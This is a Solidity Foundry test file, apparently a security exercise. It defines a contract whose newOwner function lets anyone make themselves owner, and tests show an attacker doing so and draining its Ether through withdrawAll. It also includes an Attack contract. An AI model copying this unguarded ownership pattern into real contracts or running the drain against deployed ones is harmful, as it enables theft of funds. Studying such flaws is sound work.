pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT

import "forge-std/Test.sol";

// Vulnerable Contracts as provided

contract MultiOwnable {
    mapping(address => address) public owners;

    modifier onlyOwner() {
        require(owners[msg.sender] != address(0), "Not owner");
        _;
    }

    // Vulnerable: anyone can call newOwner
    function newOwner(address _owner) external returns (bool) {
        require(_owner != address(0), "Invalid owner address");
        // Anyone can register an owner
        owners[_owner] = msg.sender;
        return true;
    }
}

contract TestContract is MultiOwnable {
    // withdrawAll allows an owner to transfer all Ether in contract
    function withdrawAll() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // receive Ether
    receive() external payable {}
}

contract Attack {
    TestContract public vulnerableContract;

    // Attack contract constructor
    constructor(address _vulnerableContract) {
        vulnerableContract = TestContract(payable(_vulnerableContract));
    }

    function attack() public {
        // The attacker calls newOwner with msg.sender in the parameter
        // Intended vulnerability: attacker becomes owner
        vulnerableContract.newOwner(msg.sender);
        // Then withdraws all Ether
        vulnerableContract.withdrawAll();
    }

    // Allow Attack contract to receive Ether
    receive() external payable {}
}


contract VulnerabilityTest is Test {
    TestContract vulnerable;
    address attacker = address(0xBEEF);
    uint256 depositAmount = 10 ether;

    function setUp() public {
        vulnerable = new TestContract();
        // Fund the vulnerable contract with some Ether
        // We use this contract's address as the sender with sufficient balance
        (bool sent, ) = address(vulnerable).call{value: depositAmount}('');
        require(sent, "Initial deposit failed");
    }

    // Test that calling withdrawAll without being owner reverts
    function testWithdrawWithoutOwnerFails() public {
        vm.prank(attacker);
        vm.expectRevert(bytes("Not owner"));
        vulnerable.withdrawAll();
    }

    // Test the vulnerability by directly exploiting newOwner to become an owner and withdraw funds
    function testExploitDirectly() public {
        // Check initial balance of attacker
        uint256 attackerBalanceBefore = attacker.balance;

        // Attacker directly calls newOwner to register themselves as owner
        vm.prank(attacker);
        bool success = vulnerable.newOwner(attacker);
        require(success, "newOwner call failed");

        // Now attacker, as owner, calls withdrawAll to transfer all Ether to themselves
        vm.prank(attacker);
        vulnerable.withdrawAll();

        // Assert that vulnerable contract has zero balance
        assertEq(address(vulnerable).balance, 0, "Vulnerable contract balance should be 0 after exploit");

        // Check that attacker received the funds. Because of gas costs, we check that the balance increased at least by depositAmount
        uint256 attackerBalanceAfter = attacker.balance;
        assertGe(attackerBalanceAfter - attackerBalanceBefore, depositAmount, "Attacker did not receive the funds");
    }

    // Test exploitation using the Attack contract
    // Note: Due to the way msg.sender is forwarded in external calls, the Attack contract attack() may not work as intended.
    // This test demonstrates that if an attacker deploys a contract to exploit the vulnerability, the exploit will fail
    // because the owner mapping is set to the provided EOA rather than the calling contract.
    function testAttackContractExploit() public {
        // Deploy the Attack contract from the attacker account
        vm.prank(attacker);
        Attack atk = new Attack(address(vulnerable));

        // Attempt to run the attack. This call, when made from the attacker account,
        // will result in newOwner(msg.sender) setting owners[attacker] = address(atk) while the withdrawAll call
        // is made by the Attack contract (msg.sender == address(atk)).
        // Thus, withdrawAll should revert because address(atk) is not registered as an owner.
        vm.prank(attacker);
        try atk.attack() {
            // If the attack() call does not revert then the exploit succeeded unexpectedly.
            revert("Attack contract exploit unexpectedly succeeded");
        } catch Error(string memory reason) {
            // We expect the call to revert with "Not owner" because the Attack contract is not recognized as owner
            assertEq(reason, "Not owner", "Unexpected revert reason");
        } catch {
            revert("Attack contract exploit reverted with unexpected error");
        }

        // Regardless, the vulnerable contract balance should remain intact
        assertEq(address(vulnerable).balance, depositAmount, "Vulnerable contract balance should remain unchanged");
    }

    // Allow the test contract to receive Ether
    receive() external payable {}
}
